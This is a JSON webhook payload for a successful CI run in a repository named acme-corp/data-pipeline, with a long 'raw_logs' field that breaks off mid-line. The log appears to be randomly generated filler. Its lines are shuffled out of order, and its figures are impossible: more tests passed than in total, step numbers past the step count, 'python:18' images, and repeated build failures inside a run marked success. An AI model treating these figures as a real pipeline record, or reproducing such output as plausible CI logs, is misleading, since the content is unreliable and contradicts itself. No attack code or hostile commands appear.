{
  "action": "completed",
  "workflow_run": {
    "id": 517,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "517d4ba346557597a7249cceae111f8eb8917b81",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-09T12:19:05.654902Z",
    "updated_at": "2025-12-09T12:22:29.608289Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\nPOST /upload - 202 (480ms)\nLoading...\nFinished.\nSnapshots: 6 passed, 25 total\n\u2713 lint completed\nArtifact downloaded: 14MB\npip: Collecting webpack\nWARNING: lodash has known vulnerabilities\n[12:19:05] INFO: Starting build process\nPushing to registry...\nnpm notice: package.json updated\nSnapshots: 20 passed, 6 total\nChecking out main branch\npip: Collecting axios\nWARNING: express has known vulnerabilities\n[12:19:05] DEBUG: Query executed in 37ms\nStep 10/17: Installing dependencies\nCoverage: 89% statements, 99% branches\nCache restored successfully (99MB)\nNODE_ENV=production\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWaiting...\npip install: Successfully installed prettier-3.7\n[12:19:05] DEBUG: Query executed in 60ms\n[12:19:05] WARN: Deprecated API usage\n  PASS: test_auth_login (320ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nHEAD is now at f51d0a7\n[12:19:05] WARN: Deprecated API usage\nProcessing...\n\u2713 build completed\nWaiting...\n\u2717 build failed with exit code 116\nChecking out master branch\nArtifact downloaded: 39MB\nGET /health - 200 (95ms)\nSuccess!\nStep 8/15: Linting\nImage pulled successfully\nSnapshots: 1 passed, 47 total\nCache restored successfully (371MB)\nCache restored successfully (493MB)\nArtifact uploaded: dist.zip (99MB)\nStep 4/16: Installing dependencies\nCompiling lib/handler.rs...\n[12:19:05] WARN: Deprecated API usage\nCompiling components/index.js...\n\u2713 validate completed\npip install: Successfully installed axios-4.16\nPushing to registry...\n[12:19:05] DEBUG: Initializing service\nMinifying main.js\nLayer 1/14: RUN command\n\u2713 Step 'checkout' succeeded\nConnecting to test.io:443...\npip: Installing build dependencies...\nCache restored successfully (241MB)\nOK\nInstalling eslint@2.20.8\npip: Collecting lodash\nNODE_ENV=production\nGenerating source maps...\nnpm notice: package.json updated\n[12:19:05] DEBUG: Loading configuration\nFinished.\nCache invalidated: dependencies\n[12:19:05] ERROR: Connection failed\nWARNING: prettier has known vulnerabilities\n[12:19:05] DEBUG: Query executed in 85ms\nStep 2/16: Installing dependencies\nConnecting to example.com:443...\nnpm install: resolved 124 packages\nPulling image: python:3.11\n[12:19:05] DEBUG: Connection pool: 20 active\n\u2713 Task completed in 2599ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 19/16: Running migrations\nOptimizing 15 modules...\nLoading...\n\u2713 All checks passed\nFAILED: test_user_create\n\u2713 All checks passed\nFinished.\npip: Downloading prettier-1.3.tar.gz\nPlatform: win32-x64\n[12:19:05] INFO: Request completed\npip: Collecting prettier\nPOST /data - 201 (128ms)\nnpm notice: created a lockfile\nPulling image: python:18\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\nPOST /api - 202 (417ms)\nCreating production build...\nCompleted.\nSuccess!\nCompiling utils/service.java...\nArtifact downloaded: 26MB\nTest Suites: 41 passed, 48 total\n[12:19:05] INFO: Starting build process\nSnapshots: 48 passed, 4 total\nImage pulled successfully\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 Task completed in 3651ms\nTests: 444 passed, 305 total\nTLS handshake completed\n  PASS: test_cache_hit (390ms)\nEnvironment: development\nTime: 109.794s\nArtifact uploaded: build.tar.gz (5MB)\nCompiling utils/main.py...\nPushing to registry...\nCompiling src/handler.rs...\nnpm install: resolved 1701 packages\n[12:19:05] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\nCreating production build...\nWARNING: prettier has known vulnerabilities\nFAILED: test_api_health\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: added 314 packages\npip: Downloading webpack-2.19.tar.gz\nWARNING: webpack has known vulnerabilities\nConnection established\nFinished.\nBuilding Docker image...\npip: Installing build dependencies...\nCoverage: 77% statements, 79% branches\nConnecting to acme.corp:443...\nConnecting to cloud.services:443...\nBuilding Docker image...\nGET /api - 204 (53ms)\n[12:19:05] DEBUG: Initializing service\nAlready up to date.\nStep 6/16: Installing dependencies\nCache restored successfully (384MB)\nCompiling components/index.js...\nOK\nOK\nUsing Node.js 15.2.3\nStep 16/17: Deploying\nPlatform: darwin-arm64\nStep 14/24: Running migrations\nLoading...\nTLS handshake completed\nCache hit for key-2729\nnpm notice: created a lockfile\nHEAD is now at 7aac4dd\nCache saved successfully\nArtifact uploaded: build.tar.gz (38MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPlatform: linux-x64\nInstalling react@4.10.6\nTLS handshake completed\nCompleted.\nPOST /upload - 202 (11ms)\nRan 99 tests in 37s\nImage pulled successfully\nCompiling components/app.ts...\nnpm install: resolved 585 packages\nChecking out main branch\nCompleted.\n\u2717 build failed with exit code 111\npip: Installing build dependencies...\nyarn add: Done in 4.81s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: node_modules\nCompiling components/main.py...\nCoverage: 99% statements, 80% branches\npip: Collecting express\nStep 16/16: Deploying\nArtifact downloaded: 44MB\nEnvironment: staging\n[12:19:05] DEBUG: Initializing service\nTLS handshake completed\nWARNING: prettier has known vulnerabilities\nCache hit for key-2681\nCompiling components/index.js...\nCompiling lib/utils.go...\nCompiling lib/app.ts...\nWaiting...\nUsing Python 3.9\n[12:19:05] DEBUG: Memory usage: 480MB\n[12:19:05] INFO: Processing request\n\u2713 Step 'install' succeeded\nAlready up to date.\nDone.\n[12:19:05] DEBUG: Connection pool: 15 active\nWARNING: prettier has known vulnerabilities\n[12:19:05] WARN: Deprecated API usage\n[12:19:05] INFO: Processing request\nChecking out master branch\npip: Collecting jest\n[12:19:05] INFO: Cache refreshed\nNODE_ENV=production\nCache saved successfully\n\u2713 All checks passed\nStep 8/24: Testing\nConnecting to cloud.services:443...\n\u2713 build completed\nWaiting...\n[12:19:05] DEBUG: Memory usage: 1195MB\nStep 14/18: Linting\n=== Step install_dependencies completed ===\n=== Step: checkout ===\nTest Suites: 11 passed, 17 total\n\u2713 All checks passed\n[12:19:05] DEBUG: Initializing service\nSnapshots: 20 passed, 43 total\nFetching submodules...\nCreating production build...\n\u2713 All checks passed\nyarn add: Done in 3.41s\n\u2713 Task completed in 374ms\n[12:19:05] INFO: Request completed\nPulling image: python:3.11\nWaiting...\nPulling image: python:latest\nnpm install: resolved 1801 packages\n  PASS: test_db_connect (238ms)\nNODE_ENV=production\n[12:19:05] INFO: Request completed\nFetching submodules...\n[12:19:05] DEBUG: Query executed in 34ms\nBuilding Docker image...\nyarn add: Done in 20.47s\nNODE_ENV=test\nFetching submodules...\nTLS handshake completed\nEnvironment: production\nArtifact uploaded: build.tar.gz (2MB)\nPulling image: node:3.11\nnpm notice: package.json updated\n[12:19:05] DEBUG: Connection pool: 17 active\nWaiting...\nPOST /upload - 201 (63ms)\nSuccess!\nLayer 10/8: COPY command\nHEAD is now at 4a75fd6\n[12:19:05] ERROR: Connection failed\nVerifying...\nUploading artifact 'coverage' (46 files)\nWaiting...\nWaiting...\nConnecting to cloud.services:443...\n[12:19:05] DEBUG: Memory usage: 1819MB\nSwitched to branch 'bugfix/task-584'\nTest Suites: 15 passed, 5 total\nStep 8/23: Installing dependencies\n[12:19:05] WARN: Deprecated API usage\nTLS handshake completed\n[12:19:05] WARN: Deprecated API usage\nLoading...\n[12:19:05] ERROR: Connection failed\nImage pulled successfully\nTests: 61 passed, 315 total\n  PASS: test_db_connect (4ms)\n[12:19:05] DEBUG: Initializing service\n\u2713 Task completed in 1593ms\nTLS handshake completed\nCompleted.\nDone.\nPushing to registry...\nWaiting...\nBuilding Docker image...\n[12:19:05] WARN: Deprecated API usage\nInstalling react@4.14.1\nCoverage: 70% statements, 91% branches\n[12:19:05] WARN: Deprecated API usage\nStep 18/23: Building\nPOST /data - 202 (349ms)\n\u2713 Step 'install' succeeded\nStep 16/21: Building\npip install: Successfully installed react-1.5\nFinished.\nCache miss for key-1975\nRan 156 tests in 10s\nPushing to registry...\nReady.\n  PASS: test_auth_login (182ms)\nArtifact uploaded: dist.zip (15MB)\nCache restored successfully (323MB)\nWaiting...\n[12:19:05] ERROR: Connection failed\nStep 6/18: Linting\nLayer 4/13: COPY command\nCreating production build...\nCache miss for key-5641\nDone.\nChecking out master branch\nLayer 4/8: ENV command\nUsing Node.js 20.12.0\nSwitched to branch 'hotfix/task-288'\nCache miss for key-8073\nUploading artifact 'dist' (49 files)\n\u2713 All checks passed\nChecking out develop branch\n[12:19:05] INFO: Processing request\nUsing Python 3.12\n[12:19:05] INFO: Connecting to database\n[12:19:05] DEBUG: Query executed in 57ms\npip: Installing build dependencies...\nConnecting to test.io:443...\nCache saved successfully\nCompiling components/main.py...\n[12:19:05] INFO: Request completed\nGenerating source maps...\nUploading artifact 'coverage' (19 files)\nCache invalidated: build\n[12:19:05] INFO: Processing request\nEnvironment: development\n\u2717 build failed with exit code 115\n[12:19:05] ERROR: Connection failed\nSnapshots: 4 passed, 18 total\nChecking out master branch\nWARNING: react has known vulnerabilities\nCompleted.\nTLS handshake completed\nCache invalidated: node_modules\nFetching submodules...\nInstalling prettier@5.5.0\n[12:19:05] INFO: Connecting to database\n  PASS: unit/test_auth_login.spec.js\n[12:19:05] WARN: Deprecated API usage\nGET /api - 201 (41ms)\nChecking out develop branch\nCache restored successfully (191MB)\npip: Collecting jest\nStep 14/17: Deploying\nFetching submodules...\n[12:19:05] WARN: Deprecated API usage\nConnection established\nCompiling utils/app.ts...\nNODE_ENV=test\n[12:19:05] INFO: Starting build process\nInstalling webpack@1.0.4\nTime: 82.370s\nRan 136 tests in 31s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2717 build failed with exit code 40\nStep 3/22: Installing dependencies\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: dist.zip (94MB)\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:05] INFO: Starting build process\nCompiling utils/main.py...\n[12:19:05] INFO: Processing request\n[12:19:05] INFO: Request completed\nWaiting...\nWaiting...\nFinished.\nTLS handshake completed\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /data - 201 (261ms)\nStep 8/20: Linting\n[12:19:05] DEBUG: Connection pool: 1 active\npip install: Successfully installed react-3.8\npip: Collecting axios\nnpm install: resolved 1461 packages\nChecking out develop branch\nCoverage: 80% statements, 91% branches\nProcessing...\n[12:19:05] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nInstalling lodash@5.1.10\n[12:19:05] DEBUG: Memory usage: 1838MB\nMinifying app.js\nImage pulled successfully\npip: Downloading lodash-4.9.tar.gz\nCache restored successfully (448MB)\nCompleted.\nTransforming 508 files...\nStep 12/21: Deploying\nImage pulled successfully\n[12:19:05] DEBUG: Connection pool: 7 active\n\u2713 All checks passed\nCache saved successfully\nSuccess!\nRan 39 tests in 25s\nGenerating source maps...\nPushing to registry...\nGET /api - 200 (24ms)\nCache miss for key-1179\nHEAD is now at 4b0d0a1\nnpm install: resolved 1336 packages\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nNODE_ENV=test\nCompiling components/app.ts...\nStep 9/25: Deploying\nCreating production build...\nPlatform: darwin-arm64\nWaiting...\nTest Suites: 37 passed, 7 total\nBuilding Docker image...\nnpm notice: created a lockfile\nStep 18/24: Linting\nGET /status - 200 (43ms)\nCache restored successfully (283MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 17.5.3\nCompleted.\n  PASS: integration/test_api_health.spec.js\n[12:19:05] DEBUG: Connection pool: 19 active\n[12:19:05] INFO: Cache refreshed\nCoverage: 87% statements, 88% branches\nWARNING: eslint has known vulnerabilities\n=== Step checkout completed ===\n=== Step: type_check ===\nProcessing...\nUsing Python 3.11\nnpm install: added 64 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLayer 6/14: ENV command\n\u2713 All checks passed\nArtifact uploaded: dist.zip (10MB)\nCoverage: 93% statements, 60% branches\nGenerating source maps...\nUploading artifact 'build' (1 files)\n[12:19:05] WARN: Deprecated API usage\nPulling image: node:18\n[12:19:05] INFO: Connecting to database\n[12:19:05] WARN: Deprecated API usage\nStep 17/22: Building\npip install: Successfully installed jest-2.4\nCreating production build...\nCompiling components/handler.rs...\nGenerating source maps...\n  PASS: test_user_create (91ms)\nCreating production build...\nUsing Python 3.10\nCache restored successfully (142MB)\nTransforming 289 files...\n[12:19:05] INFO: Connecting to database\nnpm install: added 441 packages\npip install: Successfully installed react-3.3\nSwitched to branch 'hotfix/task-338'\nTest Suites: 31 passed, 17 total\nCoverage: 75% statements, 76% branches\nyarn add: Done in 15.61s\nStep 14/19: Testing\nStep 12/25: Installing dependencies\nOK\nWARNING: prettier has known vulnerabilities\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out main branch\nCoverage: 95% statements, 88% branches\nCompiling src/main.py...\nStep 7/23: Running migrations\n[12:19:05] DEBUG: Initializing service\nVerifying...\n[12:19:05] INFO: Request completed\nTests: 402 passed, 396 total\n[12:19:05] INFO: Starting build process\nStep 18/22: Testing\nTLS handshake completed\nProcessing...\nnpm install: resolved 991 packages\nnpm install: resolved 1949 packages\nAlready up to date.\nSnapshots: 29 passed, 30 total\nException: ValueError\nTests: 395 passed, 400 total\nCompiling src/index.js...\n[12:19:05] INFO: Connecting to database\n\u2713 Task completed in 2225ms\n[12:19:05] INFO: Connecting to database\nCompiling src/main.py...\nTLS handshake completed\nImage pulled successfully\npip install: Successfully installed axios-2.13\n[12:19:05] INFO: Cache refreshed\nImage pulled successfully\nStep 16/19: Running migrations\nOptimizing 32 modules...\nVerifying...\nCompiling utils/utils.go...\nUsing Node.js 17.1.7\nBundling vendor.css\nStep 3/18: Linting\nStep 16/24: Linting\nStep 13/23: Deploying\nnpm install: added 79 packages\nTransforming 626 files...\nCache miss for key-7058\n\u2713 Task completed in 2659ms\nPushing to registry...\nStep 16/22: Running migrations\nCompiling components/utils.go...\nLayer 5/14: ENV command\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:05] DEBUG: Initializing service\n\u2713 Task completed in 3961ms\nInstalling react@4.14.1\nProcessing...\nTransforming 325 files...\n  PASS: e2e/test_cache_hit.spec.js\nSuccess!\nBuilding Docker image...\nnpm install: resolved 1996 packages\nUsing Python 3.11\nTLS handshake completed\nTests: 337 passed, 496 total\nPushing to registry...\npip: Downloading webpack-2.4.tar.gz\nDone.\nCreating production build...\n  PASS: e2e/test_auth_login.spec.js\nOptimizing 98 modules...\nOK\nFetching submodules...\nRan 21 tests in 8s\nInstalling express@5.20.0\n  PASS: test_api_health (306ms)\nFAILED: test_cache_hit\nWaiting...\nImage pulled successfully\nSnapshots: 15 passed, 35 total\nCoverage: 95% statements, 94% branches\nCreating production build...\nCache hit for key-9431\nFetching submodules...\nStep 14/16: Testing\n[12:19:05] DEBUG: Initializing service\n[12:19:05] INFO: Cache refreshed\nBundling vendor.js\nCache restored successfully (343MB)\nCompiling src/handler.rs...\n[12:19:05] DEBUG: Loading configuration\nSnapshots: 40 passed, 21 total\n\u2713 Step 'checkout' succeeded\nCompleted.\npip: Collecting jest\n[12:19:05] DEBUG: Memory usage: 174MB\nGET /status - 200 (30ms)\nPlatform: darwin-arm64\nConnecting to example.com:443...\nAlready up to date.\nStep 8/20: Installing dependencies\n\u2713 All checks passed\nTest Suites: 39 passed, 43 total\nConnection established\nException: ValueError\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPulling image: python:18\n[12:19:05] INFO: Starting build process\nNODE_ENV=production\nEnvironment: production\nEnvironment: development\npip: Collecting react\n  PASS: test_user_create (433ms)\npip: Installing build dependencies...\nReady.\n[12:19:05] DEBUG: Initializing service\n  PASS: test_auth_login (16ms)\nTest Suites: 12 passed, 17 total\nPulling image: node:latest\nVerifying...\nCache saved successfully\nOptimizing 54 modules...\npip: Collecting webpack\nStep 16/23: Installing dependencies\nException: NullPointerException\nPlatform: linux-x64\nTests: 393 passed, 383 total\nSnapshots: 31 passed, 4 total\nException: TypeError\nVerifying...\nTLS handshake completed\nOptimizing 62 modules...\nTests: 267 passed, 436 total\nFetching submodules...\n[12:19:05] INFO: Cache refreshed\nConnecting to startup.dev:443...\nWaiting...\n\u2713 All checks passed\nProcessing...\nCache hit for key-7438\nWARNING: jest has known vulnerabilities\n[12:19:05] DEBUG: Loading configuration\nFetching submodules...\nImage pulled successfully\nHEAD is now at 04dd1d4\nPlatform: darwin-arm64\n[12:19:05] INFO: Request completed\npip install: Successfully installed express-5.6\npip install: Successfully installed webpack-5.1\nStep 18/19: Linting\nLayer 10/11: RUN command\nBuilding Docker image...\n\u2713 build completed\nCache restored successfully (36MB)\n\u2713 build completed\npip: Installing build dependencies...\n[12:19:05] DEBUG: Connection pool: 18 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: dist.zip (19MB)\nChecking out main branch\nMinifying main.js\n[12:19:05] INFO: Starting build process\nGenerating source maps...\nCache saved successfully\nDone.\n[12:19:05] WARN: Deprecated API usage\nLayer 6/12: ENV command\n\u2713 All checks passed\nRan 168 tests in 36s\nBuilding Docker image...\nStep 12/24: Building\n[12:19:05] DEBUG: Loading configuration\n[12:19:05] DEBUG: Memory usage: 1929MB\n[12:19:05] DEBUG: Connection pool: 19 active\n=== Step type_check completed ===\n=== Step: deploy_staging ===\nEnvironment: test\npip: Installing build dependencies...\nWARNING: axios has known vulnerabilities\nUploading artifact 'build' (10 files)\nSnapshots: 44 passed, 31 total\n[12:19:05] INFO: Connecting to database\nPushing to registry...\nOptimizing 40 modules...\nCompiling utils/service.java...\n[12:19:05] DEBUG: Initializing service\nConnection established\nFinished.\nCompiling utils/utils.go...\nGenerating source maps...\npip install: Successfully installed prettier-5.20\n[12:19:05] DEBUG: Query executed in 31ms\nOK\nProcessing...\nEnvironment: test\n[12:19:05] DEBUG: Connection pool: 13 active\nnpm notice: created a lockfile\n\u2713 Step 'checkout' succeeded\n[12:19:05] WARN: Deprecated API usage\n\u2713 Task completed in 4723ms\nTransforming 543 files...\nFetching submodules...\n\u2717 build failed with exit code 108\npip: Downloading prettier-3.7.tar.gz\nTests: 265 passed, 130 total\nArtifact uploaded: build.tar.gz (15MB)\nCompleted.\nCompleted.\n\u2713 deploy completed\nTest Suites: 11 passed, 47 total\nLayer 3/14: ENV command\nOptimizing 19 modules...\nSuccess!\nyarn add: Done in 8.74s\nDone.\n[12:19:05] DEBUG: Memory usage: 897MB\nStep 5/15: Testing\nTests: 90 passed, 160 total\nPulling image: python:latest\nStep 9/15: Deploying\nArtifact uploaded: build.tar.gz (31MB)\npip: Downloading prettier-3.19.tar.gz\nBundling main.css\nVerifying...\nCreating production build...\nLoading...\nSuccess!\nFAILED: test_auth_login\n[12:19:05] DEBUG: Initializing service\nStep 11/24: Linting\nLayer 7/15: RUN command\nyarn add: Done in 24.44s\nRan 140 tests in 60s\nLoading...\nFinished.\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/app.ts...\nFetching submodules...\nnpm notice: created a lockfile\nTest Suites: 30 passed, 44 total\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 All checks passed\nWARNING: lodash has known vulnerabilities\n[12:19:05] DEBUG: Memory usage: 1168MB\n[12:19:05] INFO: Cache refreshed\n\u2713 All checks passed\nnpm notice: created a lockfile\nBuilding Docker image...\nCompiling components/utils.go...\nTest Suites: 16 passed, 23 total\nLayer 5/15: COPY command\n\u2713 test completed\nCreating production build...\nWaiting...\nImage pulled successfully\nCompiling src/utils.go...\nSnapshots: 39 passed, 22 total\nCompiling lib/utils.go...\nTLS handshake completed\nCache miss for key-1823\nUsing Python 3.9\nTransforming 399 files...\nTransforming 957 files...\nHEAD is now at bcaae60\nChecking out develop branch\n\u2713 Task completed in 648ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling eslint@5.11.8\n[12:19:05] WARN: Deprecated API usage\n[12:19:05] DEBUG: Initializing service\nUsing Python 3.11\nEnvironment: development\n[12:19:05] DEBUG: Query executed in 82ms\nNODE_ENV=test\nConnecting to example.com:443...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_auth_login (466ms)\nMinifying vendor.js\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: dist.zip (62MB)\nOK\nArtifact downloaded: 33MB\nnpm install: added 327 packages\nImage pulled successfully\nMinifying main.js\n[12:19:05] INFO: Processing request\nOptimizing 64 modules...\nProcessing...\nStep 9/20: Building\n[12:19:05] ERROR: Connection failed\nConnection established\nUsing Node.js 15.14.6\nnpm install: added 149 packages\nVerifying...\nSnapshots: 4 passed, 5 total\n[12:19:05] INFO: Processing request\nCache miss for key-6743\nLayer 2/12: ENV command\npip: Collecting webpack\nUsing Node.js 17.13.6\nInstalling express@5.18.4\n[12:19:05] DEBUG: Memory usage: 1984MB\nCache saved successfully\nnpm notice: package.json updated\nVerifying...\nDone.\n\u2713 build completed\nMinifying vendor.js\nConnection established\nCompiling src/main.py...\n\u2713 Task completed in 3846ms\nCompiling src/service.java...\nAlready up to date.\n[12:19:05] WARN: Deprecated API usage\npip: Collecting lodash\nImage pulled successfully\npip: Collecting axios\n[12:19:05] DEBUG: Memory usage: 950MB\nTest Suites: 48 passed, 36 total\nStep 3/15: Running migrations\nConnecting to test.io:443...\n[12:19:05] DEBUG: Initializing service\nPlatform: linux-x64\n\u2713 Task completed in 866ms\nCompleted.\npip: Downloading express-3.15.tar.gz\nCache invalidated: dependencies\nnpm notice: package.json updated\nImage pulled successfully\nUploading artifact 'coverage' (34 files)\nConnecting to example.com:443...\nCompiling components/main.py...\nnpm install: resolved 1629 packages\n[12:19:05] WARN: Deprecated API usage\n\u2717 build failed with exit code 18\nSwitched to branch 'feature/task-801'\nCompiling lib/handler.rs...\nReady.\nCompiling utils/main.py...\nStep 8/16: Building\nEnvironment: production\nAlready up to date.\nVerifying...\nConnection established\nSnapshots: 9 passed, 10 total\n\u2717 build failed with exit code 117\nHEAD is now at 1856cf2\nnpm notice: created a lockfile\nWaiting...\nCoverage: 97% statements, 95% branches\nReady.\n[12:19:05] INFO: Starting build process\nException: TypeError\nCompiling lib/main.py...\nTest Suites: 34 passed, 19 total\nArtifact downloaded: 1MB\n[12:19:05] INFO: Request completed\nAlready up to date.\n[12:19:05] WARN: Deprecated API usage\npip install: Successfully installed prettier-5.8\nConnecting to startup.dev:443...\nCreating production build...\nOK\nCache hit for key-4214\nPlatform: win32-x64\nStep 15/19: Linting\nCompleted.\n[12:19:05] ERROR: Connection failed\n\u2717 build failed with exit code 4\nCache invalidated: build\nCache saved successfully\nFinished.\n[12:19:05] DEBUG: Initializing service\nStep 13/23: Installing dependencies\nCompiling lib/app.ts...\nUsing Node.js 18.0.8\nHEAD is now at 701b418\n=== Step deploy_staging completed ===\n=== Step: setup_environment ===\nUploading artifact 'build' (3 files)\nWARNING: express has known vulnerabilities\n[12:19:05] INFO: Starting build process\nSuccess!\nLoading...\nTime: 110.367s\n\u2713 Step 'setup' succeeded\n[12:19:05] DEBUG: Query executed in 51ms\n[12:19:05] DEBUG: Loading configuration\n\u2717 build failed with exit code 64\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out main branch\n\u2713 Task completed in 299ms\nFinished.\npip: Collecting react\nTests: 244 passed, 258 total\nWARNING: lodash has known vulnerabilities\nUsing Python 3.9\nFinished.\n[12:19:05] INFO: Processing request\nTests: 77 passed, 457 total\nCache miss for key-4701\nTest Suites: 34 passed, 35 total\nFinished.\nPOST /api - 200 (89ms)\nSuccess!\n[12:19:05] DEBUG: Initializing service\nUsing Python 3.12\nSuccess!\nStep 15/16: Installing dependencies\nNODE_ENV=development\n[12:19:05] INFO: Connecting to database\nBundling main.css\n\u2713 Step 'checkout' succeeded\nStep 7/21: Linting\nConnection established\nHEAD is now at e90cd3b\nImage pulled successfully\n\u2713 deploy completed\nStep 20/23: Installing dependencies\n[12:19:05] WARN: Deprecated API usage\nNODE_ENV=development\nStep 10/15: Testing\nnpm install: added 475 packages\nBuilding Docker image...\nVerifying...\nAlready up to date.\n[12:19:05] INFO: Request completed\nArtifact downloaded: 27MB\nCache hit for key-5298\nWARNING: express has known vulnerabilities\nCache hit for key-6112\n[12:19:05] DEBUG: Loading configuration\nTest Suites: 46 passed, 16 total\n[12:19:05] INFO: Connecting to database\nWARNING: react has known vulnerabilities\nVerifying...\nStep 4/19: Testing\nUsing Node.js 17.8.0\nBuilding Docker image...\npip install: Successfully installed lodash-1.7\nPulling image: alpine:latest\nStep 12/19: Installing dependencies\nArtifact uploaded: dist.zip (31MB)\nWaiting...\npip: Downloading lodash-5.5.tar.gz\nStep 19/19: Deploying\nChecking out develop branch\nWaiting...\nGET /status - 204 (89ms)\nWaiting...\npip install: Successfully installed eslint-3.19\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: axios has known vulnerabilities\nCompiling utils/utils.go...\npip: Installing build dependencies...\nException: NullPointerException\nHEAD is now at 9dec80c\n[12:19:05] WARN: Deprecated API usage\nLayer 5/11: ENV command\nArtifact uploaded: dist.zip (73MB)\nLoading...\nCache invalidated: node_modules\n[12:19:05] INFO: Starting build process\nCreating production build...\nUploading artifact 'dist' (1 files)\n[12:19:05] INFO: Connecting to database\nCache invalidated: build\n  PASS: test_db_connect (124ms)\nArtifact uploaded: dist.zip (17MB)\nConnection established\nStep 6/15: Linting\nAlready up to date.\n[12:19:05] DEBUG: Query executed in 73ms\nDone.\nStep 10/21: Deploying\nCompiling utils/utils.go...\nUploading artifact 'coverage' (48 files)\nnpm notice: created a lockfile\nCoverage: 88% statements, 90% branches\n[12:19:05] ERROR: Connection failed\nnpm notice: package.json updated\nCache saved successfully\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 475 files...\n[12:19:05] DEBUG: Memory usage: 734MB\nnpm notice: package.json updated\n\u2713 Step 'checkout' succeeded\nSnapshots: 27 passed, 46 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 3208ms\nFAILED: test_cache_hit\n[12:19:05] DEBUG: Loading configuration\nCache miss for key-5475\nCompleted.\nnpm notice: package.json updated\nPlatform: win32-x64\nCompiling components/index.js...\nRan 119 tests in 17s\nChecking out main branch\nAlready up to date.\nWARNING: webpack has known vulnerabilities\nSuccess!\nTest Suites: 38 passed, 21 total\nArtifact uploaded: dist.zip (63MB)\n\u2717 build failed with exit code 40\nStep 5/20: Testing\nCreating production build...\nTime: 40.633s\n\u2713 Step 'install' succeeded\n  PASS: test_db_connect (242ms)\nPlatform: linux-x64\nMinifying app.js\nBuilding Docker image...\n[12:19:05] DEBUG: Initializing service\nChecking out develop branch\nCreating production build...\nArtifact downloaded: 8MB\nAlready up to date.\nStep 2/25: Linting\nnpm notice: package.json updated\npip: Installing build dependencies...\nSnapshots: 2 passed, 44 total\npip: Downloading lodash-3.17.tar.gz\nGenerating source maps...\nFinished.\nCompleted.\nTests: 388 passed, 70 total\nCompiling components/main.py...\nVerifying...\nWaiting...\nPushing to registry...\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (3MB)\nHEAD is now at d02760c\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out main branch\n[12:19:05] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\n[12:19:05] DEBUG: Query executed in 1ms\nStep 12/19: Running migrations\nOptimizing 72 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Downloading axios-1.10.tar.gz\nOK\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'dist' (10 files)\nRan 103 tests in 15s\nStep 2/24: Testing\nWARNING: lodash has known vulnerabilities\nDone.\nSuccess!\n[12:19:05] DEBUG: Memory usage: 1225MB\nSuccess!\n[12:19:05] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (65MB)\nCache hit for key-6311\n[12:19:05] DEBUG: Initializing service\nCache restored successfully (311MB)\n[12:19:05] INFO: Request completed\nStep 16/16: Running migrations\nCompiling utils/index.js...\nUploading artifact 'build' (50 files)\nNODE_ENV=test\npip: Downloading lodash-4.8.tar.gz\nArtifact downloaded: 29MB\n  PASS: test_cache_hit (86ms)\n\u2713 Step 'setup' succeeded\nCompiling lib/app.ts...\nConnection established\nLayer 3/10: ENV command\nStep 7/21: Deploying\nCompiling utils/index.js...\nException: RuntimeError\nCreating production build...\nCompiling src/service.java...\nArtifact downloaded: 13MB\nTests: 446 passed, 143 total\nSuccess!\n=== Step setup_environment completed ===\n=== Step: unit_tests ===\nMinifying main.js\nArtifact uploaded: dist.zip (75MB)\n[12:19:05] INFO: Request completed\nStep 9/23: Linting\n[12:19:05] INFO: Cache refreshed\nAlready up to date.\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/handler.rs...\nTransforming 449 files...\nWARNING: eslint has known vulnerabilities\nCache invalidated: build\nUsing Python 3.10\npip install: Successfully installed eslint-5.15\nConnection established\nArtifact uploaded: dist.zip (92MB)\nTransforming 815 files...\nVerifying...\nStep 4/22: Building\nCompiling components/index.js...\nStep 4/18: Linting\nSwitched to branch 